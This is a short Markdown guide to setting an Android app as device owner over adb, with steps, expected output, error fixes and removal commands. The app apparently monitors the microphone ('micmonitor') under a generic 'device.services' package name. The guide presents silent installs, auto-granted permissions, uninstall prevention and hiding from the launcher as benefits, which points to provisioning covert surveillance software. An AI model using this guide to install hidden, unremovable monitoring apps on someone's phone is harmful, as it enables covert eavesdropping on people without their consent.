# Device Owner Setup Guide

## ⚠️ Important Requirements

`adb shell dpm set-device-owner` only works when:
- ✅ Device is **factory reset** (fresh)
- ✅ **No Google account** added
- ✅ **No lock screen** set
- ✅ Your app is **already installed** via ADB

If ANY of these conditions are not met → command will fail!

---

## ✅ Step-by-Step Setup

### Step 1: Factory Reset Device
```
Settings → System → Reset → Factory Reset
```
Or use recovery mode (Power + Volume Down)

### Step 2: Skip Device Setup
When phone boots:
- ❌ Skip Google account
- ❌ Skip lock screen  
- ❌ Skip everything
- ✅ Go directly to home screen

### Step 3: Enable USB Debugging
```
Settings → About Phone → Tap "Build Number" 7 times
Settings → Developer Options → USB Debugging → ON
```

### Step 4: Connect & Install APK
```bash
adb devices                    # Verify connection
adb install app-release.apk    # Install your app
```

### Step 5: Set Device Owner
```bash
adb shell dpm set-device-owner com.device.services.app/com.micmonitor.app.DeviceAdminReceiver
```

Expected output:
```
Success: Device owner set to package ComponentInfo{com.device.services.app/com.micmonitor.app.DeviceAdminReceiver}
```

---

## ✅ Verify Device Owner Status
```bash
adb shell dumpsys device_policy | findstr "Device Owner"
```

Should show:
```
Device Owner: com.device.services.app
```

---

## ❌ Common Errors & Fixes

### Error: "Not allowed to set device owner"
**Cause:** Device not fresh  
**Fix:** Factory reset and skip all setup

### Error: "Device already provisioned"  
**Cause:** Google account was added during setup  
**Fix:** Factory reset, skip Google account

### Error: "Admin component not found"
**Cause:** Wrong package/receiver name  
**Fix:** Verify exact path:
```
com.device.services.app/.DeviceAdminReceiver
```

### Error: "There are already several users on the device"
**Cause:** Multiple user profiles exist  
**Fix:** Remove all secondary users or factory reset

---

## 🔓 How to Remove Device Owner (if needed)
```bash
adb shell dpm remove-active-admin com.device.services.app/.DeviceAdminReceiver
```

Or from app code:
```kotlin
val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
dpm.clearDeviceOwnerApp(packageName)
```

---

## 📱 What Device Owner Enables

Once set, your app can:
- ✅ Silent APK install/update (no user prompt)
- ✅ Auto-grant ALL runtime permissions
- ✅ Prevent app uninstall
- ✅ Hide from launcher
- ✅ Lock task mode (kiosk)
- ✅ Control system settings
